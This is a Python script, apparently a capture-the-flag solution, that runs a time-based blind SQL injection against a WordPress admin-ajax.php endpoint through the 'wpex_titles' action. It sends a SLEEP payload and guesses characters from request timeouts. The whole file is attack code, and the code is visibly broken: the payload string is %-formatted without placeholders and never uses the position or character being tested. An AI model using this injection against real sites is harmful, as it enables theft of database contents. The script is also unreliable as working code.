import requests

url = "http://eci-2zea9n2l7yg5bwqzx840.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php"
tables = "abcdefghijklmnopqrstuvwxyz0123456789-_}{"
result = ""
index=1
while(1):
    for j in tables:
        payload = 'action=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(5)))je)' % (
            index,j)
        headers = {'Content-Type': 'application/json'}
        #print(payload)
        try:
            r = requests.get(url=url, data=payload, headers=headers, timeout=3)
            #print(r.text)
        except Exception as e:
            result = result+j
            index = index+1
            print(result)
            break